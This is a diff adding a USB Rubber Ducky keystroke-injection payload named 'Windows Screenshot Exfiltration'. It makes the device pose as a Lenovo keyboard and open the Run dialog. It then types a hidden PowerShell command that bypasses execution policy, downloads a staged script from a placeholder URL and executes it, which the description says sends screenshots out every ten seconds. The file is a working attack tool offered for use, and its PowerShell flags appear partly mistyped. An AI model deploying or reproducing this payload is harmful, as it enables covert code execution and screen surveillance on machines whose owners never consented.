@@ -1,0 +1,67 @@
+REM_BLOCK DOCUMENTATION
+    Title: Windows Screenshot Exfiltration
+    Author: https://github.com/thomasboegl1
+    Description: This payload sends you screenshots of the screen every 10sec until the Powershell window is closed.
+    Target: Windows 10, 11
+    Version: 1.0
+    Category: Exfiltration
+END_REM
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+
+REM REQUIRED - Provide URL used for staged payload
+DEFINE #MY_STAGED_SCRIPT https://example.com/l/script.ps1
+
+IF ($_OS == WINDOWS) THEN
+    REM Emulate Lenovo keyboard with random serial
+    ATTACKMODE HID VID_17EF PID_609B MAN_Lenovo PROD_Duck SERIAL_RANDOM
+    REM Open the Run dialog
+    GUI r
+    DELAY 500
+    REM Type PowerShell command
+    STRINGLN powershell w- h -NoP -NonI -Exec Bypass $pl = iwr #MY_STAGED_SCRIPT; invoke-expression $pl
+ELSE
+    REM The USB Rubber Ducky will function as a flash drive
+    ATTACKMODE STORAGE
+END_IF
